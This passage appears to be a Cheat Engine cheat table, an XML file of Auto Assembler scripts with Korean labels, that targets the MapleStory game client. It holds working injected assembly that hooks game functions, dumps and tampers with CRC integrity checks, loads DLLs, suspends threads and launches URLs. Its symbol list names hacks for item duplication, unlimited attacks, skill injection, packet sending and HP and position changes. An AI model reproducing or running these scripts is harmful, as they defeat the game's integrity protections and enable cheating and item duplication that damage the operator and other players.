      <Unicode>0</Unicode>
      <CodePage>0</CodePage>
      <ZeroTerminate>1</ZeroTerminate>
      <Address>00B18DCC</Address>
      <Offsets>
        <Offset>-6</Offset>
        <Offset>102F70C</Offset>
      </Offsets>
    </CheatEntry>
    <CheatEntry>
      <ID>502</ID>
      <Description>"crcbase"</Description>
      <ShowAsHex>1</ShowAsHex>
      <VariableType>4 Bytes</VariableType>
      <Address>crcbase</Address>
      <Offsets>
        <Offset>0</Offset>
      </Offsets>
    </CheatEntry>
    <CheatEntry>
      <ID>508</ID>
      <Description>"crc 생성 dump"</Description>
      <LastState/>
      <VariableType>Auto Assembler Script</VariableType>
      <AssemblerScript>[ENABLE]
label(exit)
//createThread(00C84000)
00C84000:
mov eax,00401000 //00A24F0C
xor esi,esi
xx:
cmp esi,620000
jae exit
mov ebx,[eax]
rol ebx,06
add ebx,20000
xx2:
mov [00C85000+esi],ebx
add esi,04
add eax,04
jmp xx
exit:
ret

[DISABLE]
</AssemblerScript>
    </CheatEntry>
    <CheatEntry>
      <ID>518</ID>
      <Description>"사용안하는 비활성화crc"</Description>
      <LastState/>
      <VariableType>Auto Assembler Script</VariableType>
      <AssemblerScript>[ENABLE]
//code from here to '[DISABLE]' will be used to enable the cheat

01C83FFA:
ret
mov [dumpin-50],eax
mov [dumpin-54],ebx
mov [dumpin-58],ecx
mov [dumpin-5C],edx
mov [dumpin-60],edi
mov [dumpin-64],esi
mov [dumpin-68],esp
mov [dumpin-6C],ebp
push #30000
call [sleepde2]
mov eax,[dumpin-50]
mov ebx,[dumpin-54]
mov ecx,[dumpin-58]
mov edx,[dumpin-5C]
mov edi,[dumpin-60]
mov esi,[dumpin-64]
mov esp,[dumpin-68]
mov ebp,[dumpin-6C]
push 0
push 0
mov eax,[crcbase]
lea eax,[eax+E483F0] //crcstasrt
push eax
push eax
push 0
push 0
mov eax,[dumpin-50]
call [crea]
mov eax,[dumpin-50]
mov ebx,[dumpin-54]
mov ecx,[dumpin-58]
mov edx,[dumpin-5C]
mov edi,[dumpin-60]
mov esi,[dumpin-64]
mov esp,[dumpin-68]
mov ebp,[dumpin-6C]
push 0
push 0
mov eax,01C83FFA-610004
add eax,610004
push eax
push eax
push 0
push 0
mov eax,[dumpin-50]
call [crea]
mov eax,[highter]
mov [esp],eax//kernel32.BaseThreadInitThunk+12
ret

 
 
[DISABLE]
//code from here till the end of the code will be used to disable the cheat
</AssemblerScript>
    </CheatEntry>
    <CheatEntry>
      <ID>584</ID>
      <Description>"ThreadGet NameSpace.dll,mss32.dll"</Description>
      <LastState/>
      <VariableType>Auto Assembler Script</VariableType>
      <AssemblerScript>[ENABLE]
ThreadGet:
push allocd-80
call [loadL]
add eax,119E6
mov [018D123D],eax
xor eax,eax
push allocd-C0
call [loadL]
add eax,3b0
mov eax,[eax]
mov [018D123D+8],eax
ret
createThread(ThreadGet)
[DISABLE]

</AssemblerScript>
    </CheatEntry>
    <CheatEntry>
      <ID>585</ID>
      <Description>"다운서스펜드기"</Description>
      <LastState/>
      <VariableType>Auto Assembler Script</VariableType>
      <AssemblerScript>[ENABLE]
label(returnhere)
label(exit)
label(exit2)
01B10000:
cmp [0178F310],1
je exit
call 007608C2
jmp returnhere
exit:
push #2000000
call [sleepde2]
call 007608C2
jmp returnhere

exit2:
mov [dumpin+700],eax
mov [dumpin+704],ebx
mov [dumpin+708],ecx
mov [dumpin+70C],edx
mov [dumpin+714],edi
mov [dumpin+718],esi
mov [dumpin+71C],esp
mov [dumpin+720],ebp
push 0
push 0
mov eax,[crcbase]
lea eax,[eax+E483F0] //crcstasrt
push eax
push eax
push 0
push 0
mov eax,[dumpin-500]
call [crea]
mov eax,[dumpin+700]
mov ebx,[dumpin+704]
mov ecx,[dumpin+708]
mov edx,[dumpin+70C]
mov edi,[dumpin+714]
mov esi,[dumpin+718]
mov esp,[dumpin+71C]
mov ebp,[dumpin+720]
push 0
push 0
mov eax,[01A00C40-30]
lea eax,[eax+450] //crcstasrt
push eax
push eax
push 0
push 0
mov eax,[dumpin-500]
call [crea]
mov eax,[dumpin+700]
mov ebx,[dumpin+704]
mov ecx,[dumpin+708]
mov edx,[dumpin+70C]
mov edi,[dumpin+714]
mov esi,[dumpin+718]
mov esp,[dumpin+71C]
mov ebp,[dumpin+720]
mov [dumpin+490],#0
call MapleStory.exe+3608C2
jmp returnhere

"MapleStory.exe"+61714A:
jmp 01B10000
returnhere:

[DISABLE]

</AssemblerScript>
    </CheatEntry>
    <CheatEntry>
      <ID>593</ID>
      <Description>"ijl15.dll base 얻기"</Description>
      <LastState/>
      <VariableType>Auto Assembler Script</VariableType>
      <AssemblerScript>[ENABLE]
//code from here to '[DISABLE]' will be used to enable the cheat

01A00C40:
db 'ijl15.dll' 00

01C84300: //ijl15.dll get
push #9000
call [sleepde2]
push 01A00C40
call [LoadL]
mov [01A00C40-30],eax
ret
 
 
[DISABLE]
//code from here till the end of the code will be used to disable the cheat
</AssemblerScript>
    </CheatEntry>
    <CheatEntry>
      <ID>594</ID>
      <Description>"ijl15.dll crc"</Description>
      <VariableType>4 Bytes</VariableType>
      <Address>01A00C40-30</Address>
      <Offsets>
        <Offset>450</Offset>
      </Offsets>
    </CheatEntry>
    <CheatEntry>
      <ID>622</ID>
      <Description>"다운로드 완료"</Description>
      <LastState/>
      <VariableType>Auto Assembler Script</VariableType>
      <AssemblerScript>[ENABLE]
//code from here to '[DISABLE]' will be used to enable the cheat

015061C0:
db B4 D9 BF EE B7 CE B5 E5 B0 A1 20 BF CF B7 E1 20 B5 C7 BE FA BD C0 B4 CF B4 D9 2E 00 00 00

01506220:
db C8 AE C0 CE C0 BB 20 B4 A9 B8 A3 B8 E9 20 C1 BE B7 E1 20 B5 CB B4 CF B4 D9 2E 0D 0A B0 D4 C0 D3 C0 BB 20 C0 E7 C1 A2 BC D3 20 C7 D8 C1 D6 BC BC BF E4 2E 00 00
0190105E:
push 0
push 01506220 //제목
push 01506220
push 0
call [boxa]
push 0
push fffffffe
call [MapleStory.exe+71012C] //kernel32.TerminateProcess
ret
 
 
[DISABLE]
//code from here till the end of the code will be used to disable the cheat
</AssemblerScript>
    </CheatEntry>
    <CheatEntry>
      <ID>650</ID>
      <Description>"Auto Assemble script"</Description>
      <LastState/>
      <VariableType>Auto Assembler Script</VariableType>
      <AssemblerScript>[ENABLE]

01400200:
db '110.img' 00
01412100:
db
label(gotoread)
label(zero)
label(cmpaded)
label(gotohand)
define(alllocc,01410000)
Registersymbol(alllocc) //inzer
define(alllocc2,01414000)
Registersymbol(alllocc2) //inzer
define(alllocc3,01416000)
Registersymbol(alllocc3) //inzer

01400300:
push 0
push 08000027
push 03
push 0
push 01
push 80000000
push 01400200
call dword ptr [creafd] //kernel32.CreateFileA
mov [alllocc],eax
mov eax,[alllocc]
push 00
lea edx,[ebp+0C]
push edx
push 00001000
lea eax,[alllocc2]
push eax
gotoread:
mov ebx,[alllocc]
push ebx
call dword ptr [MapleStory.exe+7100A0] //kernel32.ReadFile

test eax,eax
je gotohand
mov eax,[ebp+0C]
test eax,eax
je gotohand
xor ecx,ecx
cmpaded:
cmp ecx,[ebp+0C]
jae zero
movzx edx,byte ptr [alllocc2+ecx]
mov ebx,eax
and ebx,000000FF
xor edx,ebx
lea ebx,[01412100]
shr eax,08
xor eax,[ebx+edx*4]
mov ebx,[alllocc3]
mov [01421300],eax
inc ecx
jmp cmpaded
zero:
push 00
lea eax,[ebp+0C]
push eax
push 00001000
lea ecx,[alllocc3]
push ecx
jmp gotoread
test ebx,ebx
je gotoexit
push ebx
gotohand:
call dword ptr [closeh] //close kernel32.CloseHandle
jmp gotoexit
gotoexit:
mov edx,[01421300]
not edx
mov eax,[esp-4]
mov [esp],eax
ret


[DISABLE]

</AssemblerScript>
    </CheatEntry>
    <CheatEntry>
      <ID>671</ID>
      <Description>"Auto Assemble script"</Description>
      <LastState/>
      <VariableType>Auto Assembler Script</VariableType>
      <AssemblerScript>[ENABLE]
//code from here to '[DISABLE]' will be used to enable the cheat

label(download)
label(goto1)
label(goto2)

01522D00:
db B3 CA B9 AB 20 BF C0 B7 A1 20 B5 C8 20 B9 F6 C0 FC C0 D4 B4 CF B4 D9 2E 00 9E 85 EB 8B 88 EB 8B A4 2E
01522D00+70:
db C8 AE C0 CE C0 BB 20 B4 A9 B8 A3 B8 E9 20 BB F5 B9 F6 C0 FC 20 B4 D9 BF EE B7 CE B5 E5 20 B8 B5 C5 A9 B7 CE 20 B5 E9 BE EE B0 A1 20 C1 FD B4 CF B4 D9 2E 00 20 EB 93 A4 EC 96 B4 EA B0 80 20 EC A7 91 EB 8B 88 EB 8B A4 2E

01961000:
mov eax,[019E0FEE]
mov eax,[eax+8]
add eax,1
push eax
push MapleStory.exe+7B0F4F //%d
push 00000003
push 01521000
call apiX7F
push 018D1245+1
push MapleStory.exe+7B0F4F //%d
push 00000003
push 01521008
call apiX7F
mov eax,[019E0FEE]
mov eax,[eax+8]
goto1:
inc eax
cmp [eax],'URL='
jne goto1
add eax,4
mov [01520D00],eax
goto2:
inc eax
cmp [eax],'&lt;&lt;&lt;&lt;'
jne goto2
mov [eax],0 //exit
mov eax,[01521000]
cmp [01521008],eax
jae download
mov eax,[highter]
mov [esp],eax//kernel32.BaseThreadInitThunk+12
ret

download:
push 0
push 01522D00
push 01522D00+70
push 0
call [boxa]

PUSH 5
PUSH 0
PUSH 0
PUSH [01520D00]
PUSH 0
PUSH 0
call [0150501C]
mov eax,[highter]
mov [esp],eax//kernel32.BaseThreadInitThunk+12
ret
createThread(01961000)
 
 
[DISABLE]
//code from here till the end of the code will be used to disable the cheat
</AssemblerScript>
    </CheatEntry>
    <CheatEntry>
      <ID>672</ID>
      <Description>"오래된 버전 URL링크 필터기,얻어오기"</Description>
      <LastState/>
      <VariableType>Auto Assembler Script</VariableType>
      <AssemblerScript>[ENABLE]
//code from here to '[DISABLE]' will be used to enable the cheat

label(download)
label(goto1)
label(goto2)

01522D00:
db B3 CA B9 AB 20 BF C0 B7 A1 20 B5 C8 20 B9 F6 C0 FC C0 D4 B4 CF B4 D9 2E 00 9E 85 EB 8B 88 EB 8B A4 2E
01522D00+70:
db C8 AE C0 CE C0 BB 20 B4 A9 B8 A3 B8 E9 20 BB F5 B9 F6 C0 FC 20 B4 D9 BF EE B7 CE B5 E5 20 B8 B5 C5 A9 B7 CE 20 B5 E9 BE EE B0 A1 20 C1 FD B4 CF B4 D9 2E 00 20 EB 93 A4 EC 96 B4 EA B0 80 20 EC A7 91 EB 8B 88 EB 8B A4 2E

01961000:
mov eax,[019E0FEE]
mov eax,[eax+8]
add eax,1
push eax
push MapleStory.exe+7B0F4F //%d
push 00000003
push 01521000
call apiX7F
push 018D1245+1
push MapleStory.exe+7B0F4F //%d
push 00000003
push 01521008
call apiX7F
mov eax,[019E0FEE]
mov eax,[eax+8]
goto1:
inc eax
cmp [eax],'URL='
jne goto1
add eax,4
mov [01520D00],eax
goto2:
inc eax
cmp [eax],'&lt;&lt;&lt;&lt;'
jne goto2
mov [eax],0 //exit
mov eax,[01521000]
cmp [01521008],eax
jbe download
mov eax,[highter]
mov [esp],eax//kernel32.BaseThreadInitThunk+12
ret

download:
push 0
push 01522D00
push 01522D00+70
push 0
call [boxa]

PUSH 5
PUSH 0
PUSH 0
PUSH [01520D00]
PUSH 0
PUSH 0
call [0150501C]
mov eax,[highter]
mov [esp],eax//kernel32.BaseThreadInitThunk+12
ret
createThread(01961000)
 
 
[DISABLE]
//code from here till the end of the code will be used to disable the cheat
</AssemblerScript>
      <CheatEntries>
        <CheatEntry>
          <ID>821</ID>
          <Description>"오래된 다운로드 완료 메세지박스"</Description>
          <LastState/>
          <VariableType>Auto Assembler Script</VariableType>
          <AssemblerScript>[ENABLE]
//code from here to '[DISABLE]' will be used to enable the cheat

015061C0:
db B4 D9 BF EE B7 CE B5 E5 B0 A1 20 BF CF B7 E1 20 B5 C7 BE FA BD C0 B4 CF B4 D9 2E 00 00 00

01506220:
db C8 AE C0 CE C0 BB 20 B4 A9 B8 A3 B8 E9 20 C1 BE B7 E1 20 B5 CB B4 CF B4 D9 2E 0D 0A B0 D4 C0 D3 C0 BB 20 C0 E7 C1 A2 BC D3 20 C7 D8 C1 D6 BC BC BF E4 2E 00 00
0190105E:
push 0
push 01506220 //제목
push 01506220
push 0
call [boxa]
push 0
push fffffffe
call [MapleStory.exe+71012C] //kernel32.TerminateProcess
ret
 
 
[DISABLE]
//code from here till the end of the code will be used to disable the cheat
</AssemblerScript>
        </CheatEntry>
      </CheatEntries>
    </CheatEntry>
    <CheatEntry>
      <ID>795</ID>
      <Description>"ijl15.dll get"</Description>
      <LastState/>
      <VariableType>Auto Assembler Script</VariableType>
      <AssemblerScript>[ENABLE]
//code from here to '[DISABLE]' will be used to enable the cheat

01A00C40:
db 'ijl15.dll' 00

01C84300: //ijl15.dll get
push #9000
call [sleepde2]
push 01A00C40
call [LoadL]
mov [01A00C40-30],eax
ret
 
 
[DISABLE]
//code from here till the end of the code will be used to disable the cheat
</AssemblerScript>
      <CheatEntries>
        <CheatEntry>
          <ID>873</ID>
          <Description>"서브 도메인작동하기"</Description>
          <LastState/>
          <VariableType>Auto Assembler Script</VariableType>
          <AssemblerScript>[ENABLE]
//code from here to '[DISABLE]' will be used to enable the cheat


label(returnhere)


01C85002:
mov [00BFEA34],00C84600
call MapleStory.exe+995DA

jmp returnhere

"MapleStory.exe"+995A9:
jmp 01C85002
returnhere:

 
 
[DISABLE]
//code from here till the end of the code will be used to disable the cheat
</AssemblerScript>
        </CheatEntry>
      </CheatEntries>
    </CheatEntry>
    <CheatEntry>
      <ID>879</ID>
      <Description>"crc작동"</Description>
      <VariableType>4 Bytes</VariableType>
      <Address>00501000</Address>
    </CheatEntry>
    <CheatEntry>
      <ID>880</ID>
      <Description>"No description"</Description>
      <ShowAsHex>1</ShowAsHex>
      <VariableType>4 Bytes</VariableType>
      <Address>00400000+7FC550+6</Address>
    </CheatEntry>
    <CheatEntry>
      <ID>881</ID>
      <Description>"No description"</Description>
      <VariableType>String</VariableType>
      <Length>2</Length>
      <Unicode>0</Unicode>
      <CodePage>0</CodePage>
      <ZeroTerminate>1</ZeroTerminate>
      <Address>017E1088-1</Address>
    </CheatEntry>
  </CheatEntries>
  <UserdefinedSymbols>
    <SymbolEntry>
      <Name>MainAddressHook2</Name>
      <Address>12311AB0</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>MainAddr2</Name>
      <Address>12311B30</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>MainAddress_2</Name>
      <Address>12311BB0</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>hook</Name>
      <Address>12311C30</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>stance</Name>
      <Address>12311E30</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>MobTrans</Name>
      <Address>12312230</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>StanceSwitch</Name>
      <Address>12312630</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>TransSwitch</Name>
      <Address>12312640</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>MultiKillSwitch</Name>
      <Address>12312650</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>DmageSwitch</Name>
      <Address>12312660</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>EnableHook2</Name>
      <Address>123126F0</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>DisableHook2</Name>
      <Address>0ADF1C30</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>SSDupeHook</Name>
      <Address>0DA90000</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>SSDupe</Name>
      <Address>0DA90080</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>SSDupe2</Name>
      <Address>0DA90480</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>SSDupe3</Name>
      <Address>0DA90880</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>SSDupeFucn</Name>
      <Address>0DA90C80</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>DupeSwitch</Name>
      <Address>0DA91080</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>MotionBase</Name>
      <Address>12311090</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>Motion7_1</Name>
      <Address>12311110</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>Motion7Thread</Name>
      <Address>12311190</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>Motion7_Call</Name>
      <Address>12311210</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>MainAddressHook</Name>
      <Address>12311290</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>MainAddr</Name>
      <Address>12311310</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>MainAddress_</Name>
      <Address>12311390</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>HPHook</Name>
      <Address>12311410</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>HP</Name>
      <Address>12311610</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>Motion</Name>
      <Address>12311A10</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>HPSwitch</Name>
      <Address>12311A90</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>DieSwitch</Name>
      <Address>12311AA0</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>EnableHook</Name>
      <Address>12312670</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>DisableHook</Name>
      <Address>0ADF1B30</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>SkillHook</Name>
      <Address>0DA91090</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>SkillHook2</Name>
      <Address>0DA91110</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>SkillInjection_1</Name>
      <Address>0DA91190</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>SkillInjection_2</Name>
      <Address>0DA91590</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>SkillCode</Name>
      <Address>10390200</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>UnlimitedAttack</Name>
      <Address>0CC90080</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>UnlimitedSwitch</Name>
      <Address>0CC90100</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>SendPacket</Name>
      <Address>0FFE3120</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>Send_Fucn</Name>
      <Address>0FFE3320</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>NDFA</Name>
      <Address>10993520</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>dupe</Name>
      <Address>105E0000</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>s1</Name>
      <Address>105E0070</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>Skill</Name>
      <Address>10390000</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>s2</Name>
      <Address>10390220</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>VehHook</Name>
      <Address>103902B0</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>HackPosition</Name>
      <Address>02790000</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>Position</Name>
      <Address>02790070</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>randomvalue</Name>
      <Address>00E90000</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>url</Name>
      <Address>04DC0000</Address>
    </SymbolEntry>
    <SymbolEntry>
      <Name>Alarm</Name>
      <Address>04DC0100</Address>
    </SymbolEntry>
  </UserdefinedSymbols>
  <DisassemblerComments>
    <DisassemblerComment>
      <Address>"ConsoleApplication11.exe"+117F0</Address>
      <Comment>fffff1
</Comment>
    </DisassemblerComment>
  </DisassemblerComments>
</CheatTable>
